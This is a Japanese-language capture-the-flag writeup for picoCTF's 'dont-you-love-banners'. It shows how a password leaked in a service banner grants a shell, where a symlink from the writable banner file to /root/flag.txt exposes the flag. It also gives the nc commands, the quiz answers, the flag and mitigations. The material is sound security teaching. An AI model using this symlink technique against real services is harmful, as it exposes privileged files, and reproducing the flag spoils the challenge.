# dont-you-love-banners — Writeup

## 概要

サービスは別ポートで**SSHバナー風にパスワードを漏らす**（例: `SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234`）という情報漏洩を起点にしている。漏れたパスワードを使って別の対話サービスに接続すると、対話の正答で `player` のシェルが与えられ、その権限で `banner` を差し替えることで `/root/flag.txt` の中身を表示させられる。

---

## 重要な観察点

* 別ポート（ログ例では `tethys.picoctf.net:58407`）に接続するとバナーに `My_Passw@rd_@1234` が含まれていた。これが認証に使えるパスワードの手がかりである。
* 対話型のサービス（例: `tethys.picoctf.net:60400`）は接続後に質問を投げ、正しい回答を送ると `player` のシェルへ移行する。
* `player` はホームディレクトリの `banner` を書き換えられる権限を持っている。

---

## 再現手順（要点）

1. 情報漏洩サーバへ接続してパスワードを確認する：

   ```bash
   nc tethys.picoctf.net 58407
   # 表示例: SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
   ```

2. 得たパスワードで対話サービスに接続する：

   ```bash
   nc tethys.picoctf.net 60400
   # 質問に答すとシェルが得られる
   # 例回答:
   # What is the top cyber security conference in the world? -> def con
   # the first hacker ever was known for phreaking... -> John Draper
   ```

3. シェル上で `banner` を差し替える：

   ```bash
   # バナーをバックアップしてシンボリックリンクで置き換え
   mv banner banner_bak
   ln -s /root/flag.txt banner
   exit   # サービス側が再接続時にバナーを表示するため一度ログアウト
   ```

   *注意*: 既に `banner` が存在する場合は `mv` で退避してから `ln -s` する。

4. 再度サービスに接続すると、表示されたバナーにフラグが含まれる：

   ```bash
   nc tethys.picoctf.net 60400
   # 表示例: picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}
   ```

---

## なぜ `My_Passw@rd_@1234` が分かったのか

別ポート（今回の例だと `58407`）の接続で表示された文字列がパスワードとしてそのまま使える形式で含まれていたためである。つまり「バナーの情報漏洩」が直接の原因であり、ブルートフォースではない。

---

## 攻撃の本質と対策

* **本質**: サービスが外部から書き換え可能な（もしくはプレーヤーが操作できる）ファイルをそのまま表示しているため、シンボリックリンクで機密ファイルを指すことで情報漏洩が発生する。
* **対策**:

  * バナー等の表示に使うファイルは信頼できる固定パスに置き、ユーザが書き換えられないようにする。
  * ファイルを開く際に `O_NOFOLLOW` を使う等、シンボリックリンク参照を防ぐ。
  * 最小権限の原則に従い、サービスが不要なファイルにアクセスしないよう制限する。

---

## 最後に

このチャレンジは「バナーやヘッダ情報の漏洩」と「ローカルの書き換え可能性（symlink）」を組み合わせることで、権限昇格なしに機密を取得できる点を学ぶ良い例である。

**Flag:** `picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}`

